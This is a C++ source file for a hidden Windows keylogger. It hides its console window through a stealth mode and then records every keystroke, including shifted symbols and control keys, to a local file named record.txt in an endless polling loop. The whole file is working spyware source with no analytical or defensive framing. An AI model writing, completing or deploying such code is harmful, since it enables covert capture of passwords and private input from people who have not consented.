#include<iostream>
#include<fstream>
#include<windows.h>
#include<winuser.h>
#include<winsock2.h>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "ws2_32.lib")

const bool STEALTH_MODE = true;

using namespace std;

void stealth() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

void log() {
	char key;
	while (true) {
		for (key = 8; key <= 222; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				ofstream write("record.txt", ios::app);
				if ((key > 64) && (key < 91) && (!GetAsyncKeyState(0x10))) {
					key += 32;
					write << key;
					write.close();
					break;
				}
				else if ((key > 64) && (key < 91)) {
					write << key;
					write.close();
					break;
				}
				else {
					switch (key) {
					case 48: 
						if (GetAsyncKeyState(0x10))
							write << ")";
						else
							write << "0";
						break;
					case 49:
						if (GetAsyncKeyState(0x10))
							write << "!";
						else
							write << "1";
						break;
					case 50:
						if (GetAsyncKeyState(0x10))
							write << "@";
						else
							write << "2";
						break;
					case 51:
						if (GetAsyncKeyState(0x10))
							write << "#";
						else
							write << "3";
						break;
					case 52:
						if (GetAsyncKeyState(0x10))
							write << "$";
						else
							write << "4";
						break;
					case 53:
						if (GetAsyncKeyState(0x10))
							write << "%";
						else
							write << "5";
						break;
					case 54:
						if (GetAsyncKeyState(0x10))
							write << "^";
						else
							write << "6";
						break;
					case 55:
						if (GetAsyncKeyState(0x10))
							write << "&";
						else
							write << "7";
						break;
					case 56:
						if (GetAsyncKeyState(0x10))
							write << "*";
						else
							write << "8";
						break;
					case 57:
						if (GetAsyncKeyState(0x10))
							write << "(";
						else
							write << "9";
						break;
					case VK_SHIFT:
						write << " ";
						break;
					case VK_CONTROL:
						write << "[ctrl]";
						break;
					case VK_MENU:
						write << "[alt]";
						break;
					case VK_SPACE:
						write << " ";
						break;
					case VK_RETURN:
						write << "\n";
						break;
					case VK_TAB:
						write << "\t";
						break;
					case VK_BACK:
						write << "[backspace]";
						break;
					case VK_DELETE:
						write << "[del]";
						break;
					}
				} 
			}
		}
	}
}

int main() {
	if (STEALTH_MODE)
		stealth();
	log();
	return 0;
}
